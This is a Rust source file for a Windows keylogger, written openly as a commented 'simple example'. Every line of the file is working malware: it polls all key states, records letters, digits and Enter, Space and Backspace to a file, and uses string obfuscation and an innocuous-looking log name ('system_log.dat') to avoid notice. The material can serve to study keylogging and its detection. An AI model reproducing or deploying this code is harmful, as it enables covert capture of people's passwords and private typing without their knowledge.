use obfstr::obfstr;// Use obfstr to obfuscate strings in the code. works pretty well with Rust.
// This is a simple keylogger example in Rust using the Windows API.
// It logs key presses to a file and exits when the Escape key is pressed.
use std::fs::OpenOptions;// Import OpenOptions to handle file operations.
use std::io::Write;// Import Write trait to write to files.
// Import necessary modules for thread sleep and duration.
// Import the Windows API function to get the state of keys.
// Import the virtual key code for the Escape key.
use std::{thread, time::Duration};// Import standard library modules for threading and time management.
use windows_sys::Win32::UI::Input::KeyboardAndMouse::{GetAsyncKeyState, VK_ESCAPE};// Import the Windows API function to get the state of keys and the virtual key code for Escape.

fn main() {
    // This is a simple keylogger example in Rust using the Windows API.
    println!("{}", obfstr!("Keylogger starting...").to_owned()); // Print a starting message to the console.

    // Infinite loop to continuously check for key presses.
    loop {
        // Sleep at the start of the loop to check periodically.
        thread::sleep(Duration::from_millis(50)); //super low resource usage, 50ms 100ms is a good balance.

        // Iterate over all possible virtual key codes (0-255).
        for key in 0..256 { // Use a range to iterate over all possible virtual key codes. i32 is used to match the type of GetAsyncKeyState.
            // Use unsafe block to call the Windows API function.
            let key_state = unsafe { GetAsyncKeyState(key as i32) }; // keya is cast to i32 to match the expected type of GetAsyncKeyState.

            // Check if the most significant bit is set, which indicates the key is currently pressed.
            if key_state & 0x8000u16 as i16 != 0 {//what is u16? It is a type that represents an unsigned 16-bit integer. It is used here to ensure the bitwise operation works correctly with the key state.
                if key as u16 == VK_ESCAPE { // Fixed type comparison
                    println!("{}", obfstr!("Escape key pressed, exiting...").to_owned());
                    return; // Exit the main function if Escape is pressed.
                }

                // Log the pressed key to a file.
                log_key(key);
            }
        } // Sleep for a short duration to avoid high CPU usage.
    } // The loop will run indefinitely until the Escape key is pressed.
}

/// Logs the given virtual key code to a file.
fn log_key(key: i32) { // This function logs the pressed key to a file.
    // Obfuscate the log file name to make it less obvious.
    let log_file_name = obfstr!("system_log.dat").to_owned(); // Convert to owned string to fix lifetime

    let mut file = match OpenOptions::new() // Create a new OpenOptions instance.
        .create(true) // Create the file if it doesn't exist.
        .append(true) // Create the file if it doesn't exist, or open it for appending.
        .open(&log_file_name) // Open the file for writing (use reference to owned string).
    {
        Ok(file) => file, // Successfully opened file
        Err(e) => {
            eprintln!("Failed to open log file: {}", e);
            return;
        }
    };

    // Create byte array before match to ensure proper lifetime
    let key_byte = [key as u8];
    // Convert the key code to a more readable string.
    let output = match key as u8 {
        0x08 => "[Backspace]",
        0x0D => "[Enter]\n",
        0x20 => " ",
        0x30..=0x39 => std::str::from_utf8(&key_byte).unwrap_or(""), // Numbers 0-9
        0x41..=0x5A => std::str::from_utf8(&key_byte).unwrap_or(""), // Letters A-Z
        _ => "", // Ignore other keys for this simple example
    };

    if !output.is_empty() {
        if let Err(e) = write!(file, "{}", output) {
            eprintln!("Failed to write to log file: {}", e);
        }
    }
}